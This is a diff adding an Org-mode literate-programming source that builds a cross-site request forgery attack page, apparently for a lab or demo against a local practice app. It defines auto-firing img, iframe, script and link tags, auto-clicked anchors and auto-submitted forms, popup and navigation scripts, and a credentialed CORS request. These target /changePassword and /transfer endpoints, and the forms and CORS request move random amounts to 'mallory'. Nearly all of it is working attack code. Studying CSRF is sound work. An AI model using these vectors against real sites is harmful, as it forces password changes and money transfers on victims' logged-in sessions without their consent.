@@ -1,0 +1,239 @@
+#+title: CSRF
+
+* OnLoad Function Call
+jQuery detects the state of readiness of the page. Code include will run once the entire page (images or iframes), not just the DOM, is ready.
+#+NAME: onload
+#+BEGIN_SRC javascript
+$(document).ready(function() {
+#+END_SRC
+
+* Variable Definitions
+Defining variable names.
+#+NAME: variable
+#+BEGIN_SRC javascript
+//var host="http://hidden-brushlands-4145.herokuapp.com/";
+var host="http://localhost:3100";
+var baseGetURL=host+"/changePassword";
+var basePostURL=host+"/transfer";
+var targetDiv=$('#targetDiv');
+#+END_SRC
+
+* URL Generator
+The =getAutoURL= function generates a new url.
+#+NAME: url
+#+BEGIN_SRC javascript
+var getAutoURL= function(){
+	return baseGetURL+"?new="+generateRandomInt(500,1000);
+}
+#+END_SRC
+
+* Random Number Generator
+The =generateRandomInt= generates a random number.
+#+NAME: random
+#+BEGIN_SRC javascript
+function generateRandomInt(min, max) {
+	return Math.floor(Math.random() * (max - min + 1) + min);
+}
+#+END_SRC
+
+* Get AutoVectors
+The four autovectors are defined in variable getAutoVectors.
+#+NAME: getautovector
+#+BEGIN_SRC javascript
+var getAutoVectors={
+	img: '<img src="'+getAutoURL()+'" />',
+	iframe: '<iframe src="'+getAutoURL()+'"></iframe>',
+	script: '<script src="'+getAutoURL()+'"></script>',
+	link: '<link href="'+getAutoURL()+'" rel="stylesheet"></iframe>'
+}
+#+END_SRC
+
+* Get EventVectors
+The four eventvectors are defined in variable geteventvector.
+#+NAME: geteventvector
+#+BEGIN_SRC javascript
+var getEventVectors={
+	anchor: '<a id="anGet" href=" '+getAutoURL()+' " target="tgtFrame">Submit</a>',
+	formGet: '<form name="frmGet" method="GET" action="'+baseGetURL+'"  target="tgtFrame">'+
+		'<input type="hidden" name="new" value="'+generateRandomInt(500,1000)+'"/> </form>',
+	popup:'<script>window.open("'+getAutoURL()+'");</script>',
+	windowNav: '<script>window.location.href="'+getAutoURL()+'";</script>'
+ }
+#+END_SRC
+
+* Post Vectors
+The vector raising post queries are defined in variable postEventVector.
+#+NAME: postvector
+#+BEGIN_SRC javascript
+var postEventVector={
+	formPost:  '<form name="frmPost" method="POST" action="'+basePostURL+'"  target="tgtFrame">'+
+		' <input type="hidden" name="transferTo" value="mallory"/>'+
+		' <input type="hidden" name="amount" value="'+generateRandomInt(200,400)+'"/> '+
+		'</form>'
+ }
+#+END_SRC
+
+* Get AutoVector Call
+jQuery responds when any cross origin request is made using getAutoVector table.
+#+NAME: getautovectortable
+#+BEGIN_SRC javascript
+$('#tblGetAutoVectors').click(function(e){
+	if(e.target.nodeName==='A'){
+	var vector=$(e.target).attr('vector');
+		if(vector === 'corsGet'){
+			//console.log('corsGet');
+			//corsLib is defined in "cors-csrf.js" file. It has  CORS GET & POST methods 
+			corsLib.get(getAutoURL());
+		}
+		else {
+			var markup=getAutoVectors[vector];
+			targetDiv.append(markup);
+		}
+	}
+});
+#+END_SRC
+
+* Get EventVector Call
+jQuery responds when any cross origin request is made using getEventVector table.
+#+NAME: geteventvectortable
+#+BEGIN_SRC javascript
+$('#tblGetEventVectors').click(function(e){
+	if(e.target.nodeName==='A'){
+		//$('#targetContainers').css('opacity', 1);
+		var vector=$(e.target).attr('vector'); //anchor, form
+		var markup=getEventVectors[vector];
+		targetDiv.append(markup);
+		if (vector==='anchor') { 
+			document.getElementById('anGet').click();
+		} 
+		if (vector==='formGet') { 
+			document.forms.frmGet.submit();
+		} 
+	}
+});
+#+END_SRC
+
+* Post Vector Call
+jQuery respnds when any cross origin request is made using PostVector table.
+#+NAME: postvectortable
+#+BEGIN_SRC javascript
+$('#tblPostVectors').click(function(e){
+		if(e.target.nodeName==='A'){
+			var vector=$(e.target).attr('vector');
+			if(vector=== 'corsPost'){
+				//console.log('corsPost');
+				var params="transferTo=mallory&amount="+generateRandomInt(200,400);
+				corsLib.post(basePostURL, params);
+			}
+			else{
+				var markup=postEventVector[vector];
+				targetDiv.append(markup);
+				document.forms.frmPost.submit();
+			}
+		}
+	});
+});
+#+END_SRC
+
+* Corslib Object
+#+NAME: corslib
+#+BEGIN_SRC javascript
+var corsLib = {
+#+END_SRC
+
+* Cross Origin Request
+#+NAME: corsrequest
+#+BEGIN_SRC javascript
+makeCORSRequest: function(method, url) {
+    var xhr = new XMLHttpRequest();
+    if ("withCredentials" in xhr) {
+        // XHR for Chrome/Safari/Firefox.
+		xhr.withCredentials = true;
+        xhr.open(method, url, true);
+    } else if (typeof XDomainRequest != "undefined") {
+        // XDomainRequest for IE.
+        xhr = new XDomainRequest();
+        xhr.open(method, url);
+    } else {
+        // Browser doesn't support CORS
+        xhr = null;
+    }
+    return xhr;
+},
+#+END_SRC
+
+* Get CORS Request
+#+NAME: getcors
+#+BEGIN_SRC javascript
+get: function (getUrl) {
+    var url = getUrl;
+    var xhr = this.makeCORSRequest('GET', url);
+    if (!xhr) {
+        alert('CORS not supported');
+        return;
+    }
+
+    xhr.onload = function () {
+        var text = xhr.responseText;
+		//console.log('CORS request URL: \n' + url + '\n\nCORS Response: \n' + text);
+    };
+
+    xhr.onerror = function (err) {
+        //console.log(err);
+    };
+
+    xhr.send();
+},
+#+END_SRC
+
+* Post CORS Request
+#+NAME: postcors
+#+BEGIN_SRC javascript
+post: function (postUrl, params) {
+        var url = postUrl;
+        //var params = 'name=' + txtName;
+
+        var xhr = this.makeCORSRequest('POST', url);
+        if (!xhr) {
+            alert('CORS not supported');
+            return;
+        }
+
+        xhr.onload = function () {
+            var text = xhr.responseText;
+            //console.log('CORS request URL: \n' + url + '\n\nCORS Response: \n' + text);
+        };
+
+        xhr.onerror = function () {
+            //console.log('Woops, there was an error making the request.');
+        };
+        
+        xhr.setRequestHeader("Content-Type", 'application/x-www-form-urlencoded');
+        xhr.send(params);
+    }
+}
+#+END_SRC
+
+* Tangle CSRF
+#+NAME: functions
+#+BEGIN_SRC javascript :tangle csrf.js :eval no :noweb yes
+<<onload>>
+<<variable>>
+<<url>>
+<<random>>
+<<getautovector>>
+<<geteventvector>>
+<<postvector>>
+<<getautovectortable>>
+<<geteventvectortable>>
+<<postvectortable>>
+#+END_SRC
+
+* Tangle CORS-CSRF
+#+NAME: corsfunctions
+#+BEGIN_SRC javascript :tangle cors-csrf.js :eval no :noweb yes
+<<corslib>>
+<<corsrequest>>
+<<getcors>>
+<<postcors>>
+#+END_SRC
